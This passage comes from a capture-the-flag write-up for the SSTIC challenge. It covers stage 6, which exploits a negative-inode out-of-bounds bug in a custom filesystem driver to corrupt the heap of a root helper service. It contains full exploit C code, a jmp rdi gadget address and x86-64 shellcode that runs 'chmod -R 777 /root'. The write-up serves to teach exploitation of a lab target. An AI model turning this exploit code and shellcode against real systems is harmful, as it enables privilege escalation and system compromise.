    PS: Maybe it's a bad idea to talk about all that here...

SSTIC{c96f1fa046e5e998e5ae511d9c846fcd}
```

And there is our flag for stage 5!

## Stage 6

Our final goal is to access `/root/final_secret.txt`, which will require us to gain root privileges on the system. The hint in `note.txt` mentions that compromise of `mounter_server` is possible, somehow. We will probably have make use of negative inode numbers to do this.

> Side-note: during the competition, a hint was released for stage 6 in the `note.txt` file. The [previous version of the file](files/stage5/goodfs/note.txt.pre-hint) did not mention negative inodes.

There are two places in the code where negative inode numbers can cause trouble. First, in `goodfs_iget`:

```c
inode *goodfs_iget(super_block *s, unsigned __int64 ino)
{
  struct inode *v2;
  struct buffer_head *v4;
  goodfs_inode *v6;

  v2 = iget_locked(s, ino);
  if ( !v2 )
  {
    ...
  }
  if ( v2->i_state & I_NEW )
  {
    v4 = _bread_gfp(s->s_bdev, 32 * ((int)ino + 4) / 4096, s->s_blocksize, 8u);
    if ( v4 )
    {
      v6 = (goodfs_inode *)&v4->b_data[32 * (int)((unsigned __int64)(32 * ((int)ino + 4) % 4096) >> 5)];
      v2->i_mode = v6->mode & 0xC1FF;
      v2->i_uid.val = v6->uid.val;
      v2->i_gid.val = v6->gid.val;
      ...
```

Similarly, in `goodfs_write_inode`:

```c
int __fastcall goodfs_write_inode(inode *inode, writeback_control *wbc)
{
  unsigned __int64 v2;
  struct buffer_head *v3;
  buffer_head *v4;
  goodfs_inode *v5;

  v2 = (unsigned __int64)((int)(32 * (inode->i_ino + 4)) % 4096) >> 5;
  v3 = _bread_gfp(inode->i_sb->s_bdev, (int)(32 * (inode->i_ino + 4)) / 4096, inode->i_sb->s_blocksize, 8u);
  if ( !v3 )
    return -12;
  v4 = v3;
  v5 = (goodfs_inode *)&v3->b_data[32 * (int)v2];
  v5->uid.val = inode->i_uid.val;
  v5->gid.val = inode->i_gid.val;
  v5->mode = inode->i_mode & 0xC1FF;
  v5->size = inode->i_size;
  v5->data_block = (__u16)inode[-1].i_private;
  v5->atime = inode->i_atime.tv_sec;
  v5->mtime = inode->i_mtime.tv_sec;
  mark_buffer_dirty(v4);
  _brelse(v4);
  return 0;
}
```

`32 * (ino + 4)` is divided and modulo'd by 4096 to yield the block number and byte offset of the inode within that block. However, the modulo and division is being performed on the number *casted to a signed int*. Division with signed numbers rounds towards zero (truncation). If the inode number (`ino`) is between -131 and -5, the result is a block number of zero, but a *negative byte offset* (inode numbers below -131 yield negative block numbers, which are rejected by `__bread_gfp`). Note that other goodfs functions either use the full 64-bit inode number (`goodfs_read`/`goodfs_write`), perform zero-extension (`goodfs_readdir`) or check that the inode is in the range [0, 252) (`goodfs_evict_inode`).

The negative offset results in an out-of-bounds access with respect to the copy of disk block 0 in the page cache (`b_data`). Since these cached pages are simply allocated straight out of physical memory using the kernel page allocator, the memory page immediately preceding the cached disk block 0 page may belong to any process or kernel function. Therefore, using negative inodes, we have a restricted ability to read or write some page of memory belonging to something else in the system: reading is achieved by performing `stat` on a negative inode file or directory, while writing is achieved by modifying some fields (such as the timestamp fields) and unmounting the filesystem (thereby committing the writes via `goodfs_write_inode`).

Normally, this would be a good time to find some kernel data structure that can be repeatedly allocated, spray live copies of the data structure in RAM, and hope that one of the copies winds up in the page preceding disk block 0. We would then corrupt that data structure, which would hopefully be enough to achieve kernel compromise.

However, in this particular challenge, `mounter_server` runs as root, and the hint in the [`note.txt`](files/stage5/goodfs/note.txt) suggests that it is the target we should focus on. `mounter_server` has some unusual features and an outright memory leak bug:

1. The buffer used by `mounter_server` that holds a copy of the `mount_shm` contents is allocated using `malloc` (from GLibc). 
If you put in an invalid password, the buffer is not freed.
2. `mounter_server` uses the syslog facility to write messages about the most recent command.
3. If the command/argument pair is `mount goodfs` or `umount goodfs`, the command will be logged using the `syslog_command` function. Otherwise, the message `Bad command` will be logged.
4. `syslog_command` copies both arguments into a stack-allocated buffer. If an error occurred, the string `Error: ` is prepended and a function pointer is set to `syslog_error`; otherwise, nothing is prepended and the function pointer is set to `syslog_info`. The function pointer is then called to log the message.

At first glance, this is not exploitable: only five messages can possibly be logged:

- `Bad command`
- `mount goodfs`
- `umount goodfs`
- `Error: mount goodfs`
- `Error: umount goodfs`

Once it became clear that "negative inodes" were involved, a plan formed: what if the negative inodes could be used to overwrite the command and/or argument strings in the heap buffer - after they are checked by `do_command` but before they are logged with `syslog_command`? In that case, we could overflow the stack inside `mounter_server`, and due to the lack of protections (no PIE, no NX), we should be able to trivially compromise it. Furthermore, we can abuse the memory leak bug (#1) to leak lots of memory to more precisely control which heap page will be allocated.

### Exploiting `mounter_server` via Negative Inodes

First, we want a way to fill a directory full of arbitrary inodes. This is easy enough to do with the exploit from stage 5, but I also wanted to be able to modify the listing dynamically for greater flexibility. To achieve this, I needed to arrange for a directory and a file to share the same disk block, yet have different inode numbers (so we could write to the file inode and read from the directory inode). Since inodes created by goodfs always use the same disk block (inode + 2), we needed a way to completely forge inode structures.

To achieve this, I filled a directory with inodes in the range of 892-923 using the stage 5 exploit. These out-of-range inodes are loaded from disk block 7 (`(892 + 4) / 128`), which happens to be the first free disk block. Thus, the first file that I create will contain the inode data for these out-of-range inodes, enabling me to arbitrarily forge inode data. Then, I can configure one of these fake inodes to be a directory with a `data_block` pointing at disk block 8, thus overlapping with the data of the second file I create, enabling me to arbitrarily and repeatedly forge directory entries in this directory by modifying the second file.

Here's how that looks in code:

```c
struct goodfs_inode {
  int uid, gid;
  uint64_t atime, mtime;
  unsigned short data_block, mode;
  int size;
};

/* Init corrupted filesystem.

Key entries:

/mnt/goodfs/public/inodes: inode 5, editable inode data for fake inodes 892~923
/mnt/goodfs/public/dirents: inode 6, editable directory entries
/mnt/goodfs/public/raw/: contains several inodes: 0~7 and 892~899
*/
void init_fs() {
    int fd;

    /* Make a file to hold fake superblock inodes */
    struct goodfs_inode inodes[3];
    // Only directories use data_block
    inodes[0].uid = 1337;
    inodes[0].gid = 1337;
    inodes[0].atime = 1337;
    inodes[0].mtime = 1337;
    inodes[0].data_block = 0;
    inodes[0].mode = 040777;
    inodes[0].size = 4096;

    inodes[1].uid = 1337;
    inodes[1].gid = 1337;
    inodes[1].atime = 1337;
    inodes[1].mtime = 1337;
    inodes[1].data_block = 1;
    inodes[1].mode = 040777;
    inodes[1].size = 4096;

    inodes[2].uid = 1337;
    inodes[2].gid = 1337;
    inodes[2].atime = 1337;
    inodes[2].mtime = 1337;
    inodes[2].data_block = 8;
    inodes[2].mode = 040777;
    inodes[2].size = 4096;

    // Writing to this file will modify the inode data for inodes 892~899
    fd = open("/mnt/goodfs/public/inodes", O_CREAT | O_RDWR, 0777);
    write(fd, inodes, sizeof(inodes));
    close(fd);

    // Writing to this file will modify the directory entries for data block 8
    fd = open("/mnt/goodfs/public/dirents", O_CREAT | O_RDWR, 0777);
    close(fd);

    /* Allocate enough inodes to spill the new inodes into the second superblock block */
    xmkdir("/mnt/goodfs/public/hack", 0777);
    xmkdir("/mnt/goodfs/public/hack/d0", 0777);
    xmkdir("/mnt/goodfs/public/hack/d1", 0777);
    xmkdir("/mnt/goodfs/public/hack/d2", 0777);
    xmkdir("/mnt/goodfs/public/hack/d3", 0777);
    xmkdir("/mnt/goodfs/public/hack/d4", 0777);
    xmkdir("/mnt/goodfs/public/hack/d5", 0777);
    xmkdir("/mnt/goodfs/public/hack/d6", 0777);
    xmkdir("/mnt/goodfs/public/hack/d7", 0777);
    for(int i=0; i<110; i++) {
        char path[256];
        sprintf(path, "/mnt/goodfs/public/hack/d%d/f%d", i / 16, i % 16);
        fd = open(path, O_CREAT | O_RDWR, 0666);
        if(fd < 0) {
            printf("failed to create %s: %d\n", path, fd);
        }
        close(fd);
    }
    /* prevent create from propagating atime change to root inodes */
    my_xutime("/mnt/goodfs/public/hack", 0x7fffffff, 0x7fffffff);
    do_umount();

    do_mount();
    /* When creating this inode, the free bitmap update (on the first superblock block)
       will not be committed because of a missing mark_buffer_dirty.
       The inode itself is created on the second superblock block. */
    fd = open("/mnt/goodfs/public/hack/fd1", O_CREAT | O_RDWR, 0777);
    struct goodfs_dir_entry entries[16];
    for(int i=0; i<8; i++) {
        entries[i].ino = i;
        sprintf(entries[i].name, "i%d", i);
    }
    for(int i=0; i<8; i++) {
        entries[i+8].ino = i+892;
        sprintf(entries[i+8].name, "i%d", i+892);
    }
    write(fd, entries, sizeof(entries));
    close(fd);
    do_umount();

    do_mount();
    /* This directory inode will reuse the "fd1" inode. Due to another missing
       mark_buffer_dirty, the zeroing of the data block will not be committed. */
    xmkdir("/mnt/goodfs/public/raw", 0777);
    do_umount();

    do_mount();
}
```

Writing to the file `/mnt/goodfs/public/dirents` thus modifies the contents of the directory `/mnt/goodfs/public/raw/i894`.

Next, to explore the contents of the negative inode page, we can use `fstat` to retrieve the information on each inode. `stat` is blocked, and `fstat` requires an open file - we cannot necessarily open these negative inode files since their ownership or mode is loaded from uncontrolled memory. Luckily, we can use `O_PATH` to open a "path" fd which allows `fstat` to function identically to `stat`. This lets us build a rudimentary "hexdump" tool for the negative inode page ([`shellcode3.c`](files/stage6/shellcode3.c)):

```c
void showstat(const char *path, int raw) {
    /* Open with O_PATH to simulate stat() */
    int fd = open(path, 010000000, 0);
    if(fd < 0) {
        printf("[open err: %d]\n", fd);
        return;
    }
    struct stat stat;
    int res = fstat(fd, &stat);
    if(res < 0) {
        printf("[stat err: %d]\n", res);
        close(fd);
        return;
    }

    if(!raw) {
        char mode[8];
        for(int i=0; i<7; i++) {
          mode[i] = '0' + ((stat.st_mode >> ((6 - i) * 3)) & 7);
        }
        mode[7] = 0;
        printf("uidgid=%d:%d amtime=%d:%d mode=%s size=%d devino=%d:%d nlink=%d\n",
            stat.st_uid, stat.st_gid,
            stat.st_atime, stat.st_mtime,
            mode, stat.st_size,
            stat.st_dev, stat.st_ino, stat.st_nlink);
    } else {
        unsigned char inode[32];
        memcpy(&inode[0], &stat.st_uid, 4);
        memcpy(&inode[4], &stat.st_gid, 4);
        memcpy(&inode[8], &stat.st_atime, 8);
        memcpy(&inode[16], &stat.st_mtime, 8);
        memset(&inode[24], 0xcc, 2);
        memcpy(&inode[26], &stat.st_mode, 2);
        memcpy(&inode[28], &stat.st_size, 4);
        for(int i=0; i<32; i++) {
            printf("%x%x", inode[i] >> 4, inode[i] & 0xf);
        }
        printf("\n");
    }

    close(fd);
}

int main() {
    int fd;

    do_mount();

    fd = open("/mnt/goodfs/public/raw", O_DIRECTORY | O_RDONLY, 0777);
    if(fd < 0) {
        printf("Init fs\n");
        init_fs();
    }
    close(fd);

    do_umount();

    do_mount();

    /* The file /dirents and the directory /raw/i894 have the same data block,
       allowing us to write directory entries to /dirents and read them back
       out in /raw/i894. */
    for(int offset = -131; offset < 32; offset += 32) {
        fd = open("/mnt/goodfs/public/dirents", O_RDWR, 0777);
        if(fd >= 0) {
            struct goodfs_dir_entry entries[32];
            for(int i=0; i<32; i++) {
                entries[i].ino = offset + i;
                sprintf(entries[i].name, "hack%d", offset + i);
            }
            write(fd, entries, sizeof(entries));
            close(fd);
        } else {
            printf("failed to open /dirents: %d\n", fd);
        }
        for(int i=0; i<32; i++) {
            char path[256];
            sprintf(path, "/mnt/goodfs/public/raw/i894/hack%d", offset + i);
            showstat(path, 1);
        }
    }

    do_umount();

    exit_group(0);
}
```

With this, we can explore different combinations of allocating with `mmap` and leaking memory in the `mounter_server`. The combination I ended up using was to allocate 8192 dummy pages with `mmap`, then perform 98 `mounter_server` commands with the wrong password to leak memory. A final `mount` command would allocate disk block 0 immediately after the most recent heap page in `mounter_server`, allowing us to manipulate the heap via the negative inode page.

All changes made to inodes between the `mount` and `umount` commands will be committed when the filesystem is unmounted, so the heap memory will be overwritten while processing the `umount` command inside `mounter_server`. We therefore arrange to fill the `umount` command with a mostly completed payload that will smash the stack of `syslog_command`, overwrite the function pointer with the very handy gadget `jmp rdi`, and contain executable code in place of the message to be logged (it'll be in the heap, which is executable because the stack is marked executable). The payload will be activated by overwriting the `umount` command name and null byte with a modified inode structure.

Here's the sequence of steps for the final exploit:

1. Corrupt the filesystem (as in stage 5): create two files at disk blocks 7 (`inodes`) and 8 (`dirents`), and then corrupt the filesystem to create a directory with inode entries in the range of 892-923.
2. Allocate a bunch of memory with `mmap`, touching each page to ensure it's faulted in.
3. Allocate a bunch of heap memory in `mounter_server` by sending it commands with invalid passwords.
4. Construct a valid `mount` command buffer for `mount_shm`, with certain bytes set to create fake inodes in memory (specifically: setting uid=gid=1000 for a few inodes so they can be modified by the shellcode in the FTP server process)
5. Fill the `dirents` file with negative inodes, so that we can access the negative inodes from the corresponding directory (`i894`).
6. Use `utime` to change the modification times of some particular inodes. These inodes are chosen specifically to overlap the `umount` and `goodfs` strings in the later unmount command.
7. Construct a valid `umount` command buffer, with shellcode and function pointer address ready to go.
8. Send the command buffer to `mounter_server`, which sees a valid `umount` command. During `umount`, the negative inodes are written back, corrupting the `umount` and `goodfs` strings in the heap.
9. `mounter_server` calls `syslog_command`, which will copy the corrupted strings to a stack buffer, resulting in a stack overflow. The message payload is filled with shellcode, and the function pointer is redirected to a `jmp rdi` gadget. The function pointer is executed, jumping to the shellcode and executing arbitrary code as root inside `mounter_server`.
10. The shellcode simply performs `chmod -R 777 /root` to give the FTP server access to the secret files.
11. Read `/root/final_secret.txt` to win!

Here's the final shellcode ([`shellcode4.c`](files/stage6/shellcode4.c)):

```c
int mount_leak() {
    int mfd = open("/run/mount_shm", 2, 0);
    void *maddr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mfd, 0);
    struct mounter_shmem *m = (struct mounter_shmem *)maddr;
    strcpy(m->password, "NotThePassword");
    m->flag = 1;
    while(m->flag == 1)
      usleep(1000);
    int res = m->flag;
    munmap(maddr, 0x1000);
    close(mfd);
    return res;
}

int hack_command(char *buf, char *command) {
    int mfd = open("/run/mount_shm", 2, 0);
    void *maddr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mfd, 0);
    struct mounter_shmem *m = (struct mounter_shmem *)maddr;
    memcpy(m->password, buf, 768);
    strcpy(m->password, "MGhtT34gHj5yFcszRYB4gf45DtymEi");
    strcpy(m->command, command);
    strcpy(m->arguments, "goodfs");
    m->flag = 1;
    int iterations = 0;
    while(m->flag == 1 && iterations++ < 1000)
      usleep(1000);
    int res = m->flag;
    munmap(maddr, 0x1000);
    close(mfd);
    return res;
}

int main() {
    int fd;

    printf("Starting run\n");

    do_mount();

    fd = open("/mnt/goodfs/public/raw", O_DIRECTORY | O_RDONLY, 0777);
    if(fd < 0) {
        printf("Init fs\n");
        init_fs();
    }
    close(fd);

    do_umount();

    printf("Alloc a lot\n");

    /* Steal lots of bits of memory */
    for(int i=0; i<256; i++) {
        char *ptr = (char *)mmap(0, 32 * 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if(ptr == NULL) {
            printf("mmap failed!\n");
            exit_group(1);
        }
        for(int j=0; j<32; j++) {
          ptr[4096 * j] = i + j + 1;
        }
    }

    printf("Leak via umount\n");

    for(int i=0; i<98; i++) {
        mount_leak();
    }

    /* set uid/gid = 1000 */
    printf("Final mount\n");

    char insert_buf[768];
    memset(insert_buf, 0xcc, 768);
    *(int *)&insert_buf[240] = 1000;
    *(int *)&insert_buf[244] = 1000;
    *(int *)&insert_buf[496] = 1000;
    *(int *)&insert_buf[500] = 1000;
    hack_command(insert_buf, "mount");

    printf("Hacking block -1\n");

    /* The file /dirents and the directory /raw/i894 have the same data block,
       allowing us to write directory entries to /dirents and read them back
       out in /raw/i894. */
    int offset = -85;
    fd = open("/mnt/goodfs/public/dirents", O_RDWR, 0777);
    if(fd >= 0) {
        struct goodfs_dir_entry entries[32];
        for(int i=0; i<32; i++) {
            entries[i].ino = offset + i;
            sprintf(entries[i].name, "hack%d", offset + i);
        }
        write(fd, entries, sizeof(entries));
        close(fd);
    } else {
        printf("failed to open /dirents: %d\n", fd);
    }
    lsdir("/mnt/goodfs/public/raw/i894", 1);

    my_xutime("/mnt/goodfs/public/raw/i894/hack-77", 0x4141414141414141, 0x4242424242420eeb);
    my_xutime("/mnt/goodfs/public/raw/i894/hack-69", 0x4141414141414141, 0x4242424242420eeb);
    lsdir("/mnt/goodfs/public/raw/i894", 1);

    printf("Final umount\n");

    memset(insert_buf, 0xcc, 768);
    memcpy(
      &insert_buf[256+16],
      "\x31\xc0\x48\x8d\x3d\xf7\xff\xff\xff\x57\x5b\x48\x83\xc3\x3c\x88\x03\x48\x83\xc3\x03\x88\x03\x48\x83\xc3\x13\x88\x03\x50\x54\x5a\x48\x83\xc7\x35\x48\x8d\x4f\x0b\x51\x48\x8d\x4f\x08\x51\x57\x54\x5e\xb0\x3b\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\xcc\x2d\x63\xcc\x63\x68\x6d\x6f\x64\x20\x2d\x52\x20\x37\x37\x37\x20\x2f\x72\x6f\x6f\x74\xcc",
      83
    );
    insert_buf[256+160] = 0;
    /* 0x004016ed: jmp rdi */
    *(unsigned long long *)&insert_buf[551] = 0x004016ed;
    hack_command(insert_buf, "umount");

    char secret_buf[4096];
    lsdir("/root", 0);
    fd = open("/root/final_secret.txt", O_RDONLY, 0666);
    if(fd < 0) {
        printf("failed to open final secret :(\n");
    }
    int res;
    while(1) {
        res = read(fd, secret_buf, 4096);
        if(res <= 0) {
            break;
        }
        write(5, secret_buf, res);
    }
    exit_group(0);
}
```

The root shellcode (which is copied to `&insert_buf[256+16]` above) is given in [`root_shellcode.s`](files/stage6/root_shellcode.s), and looks like this:

```
BITS 64
start:
xor eax, eax
lea rdi, [rel start]

; insert nulls
push rdi
pop rbx
add rbx, arg1-1-start
mov [rbx], al
add rbx, cmd-arg1
mov [rbx], al
add rbx, end-cmd
mov [rbx], al

push rax                ; NULL
push rsp
pop rdx                 ; envp -> [NULL]

add rdi, bin-start
lea rcx, [rdi+cmd-bin]
push rcx                ; "$CMD$"
lea rcx, [rdi+arg1-bin]
push rcx                ; "-c"
push rdi                ; "/bin/sh"
push rsp
pop rsi                 ; argv -> ["/bin/sh", "-c", "$CMD$", NULL]

mov al, 59              ; __NR_execve
syscall

bin: db "/bin/sh", 0xcc
arg1: db "-c", 0xcc
cmd: db "chmod -R 777 /root", 0xcc
end:
```

When run, this produces the contents of [`final_secret.txt`](files/stage6/final_secret.txt), translated:

```
We have finally received a transmission from our home planet!

This transmission line hides several of them, so that no human can read its contents.

World domination is at hand, hahahahaha!
HAhAhAhAHA!!
MOUHAAHAAAAHAHAHAHAAAAAAAAA!!!!!!

SSTIC{f29983c5d404138a9905aa920d273704}

kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0O0000000000000000000000000000000000000000000000000000000000000000000K0K0K0KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK...
```

There's our flag for stage 6!

## Final Stage

As usual, there's one more step to go before we can declare victory. We need to decode this "transmission".

The "transmission" (the last line of `final_secret.txt`) is 104219 bytes long. This number factorizes as 1171x89. If we split the transmission into lines of 1171 bytes long, we get [`final_secret_lines.txt`](files/stage6/final_secret_lines.txt); without word wrapping, the left few columns look like this:

```
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0O00000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOOOOOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO000000O0000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOOkOkOkOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00O0O0O0000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO000O0000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0O0000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O00O000O00000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOOOOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0O000O0000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0O00000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0O00000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0O00O0O000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O00O000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO000O0000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00O0O0O0000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00000000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0O0000O000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00O0O000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0OO0O00000O000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0O0O00000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO000O0O00000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00O0O0O0000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOOOkxxdododdxxkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOxl;,.........',:okOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00O0O0O0O0000000000oooooooooooooooooooooooooox0000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOOkd:'.               ..,cxOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO000O0O0000000000000                          ;0000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkc.                      'oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0O000000000000                          ,0000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx,        ....,'...        .:kOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O00O00000000000000                          ,0000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk'       .,oxkOOOOkxl,        cOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O00O0O0000000000      .;:;;;:::;:;::::::::o0000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd       .lkOOOOOOOOOOx:       .kOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0O0000000000000      l000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk.      .dOOOOOOOOOOOOOOl.      cOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O00000000000000      l000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx       dOkOOOOOOOOOOOOOOc      .OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0O0000000000000      l000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd      .kOOOOOOOOOOOOOOOOx       OOOOOOOOOOOOOOOOOOOOOOxdlccccccloxkOO0O0O0O0000000000000      l00000000000000000000000000000000O
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd      'kOOOOOOOOOOOOOOOOO       OOOOOOOOOOOOOOOOOOOxc,..         .'cx0O0O000000000000000      l0000000000000000000000000000000l,
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx      .kOOOOOOOOOOOOOOOOx      .OOOOOOOOOOOOOOOOxc,.                .,lk0000000000000000      l0000000000000000000000000000000, 
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk.      dOOOOOOOOOOOOOOOOc      cOOOOOOOOOOOOOOOo.                      'k0O0000000000000      l0000000000000000000000000000000, 
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko      .dOOOOOOOOOOOOOkc      .xOOOOOOOOOOOOOk;.      ..;:cccc:;..      .o00000000000000      ,c:;;,',;;:cldk00000000000000000l;
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkc      .ckOOOOOOOOOOx;      .xOOOOOOOOOOOOOk,      .;dOOOOOOOOOOd,      .xO000000000000                    .;x00000000000000000
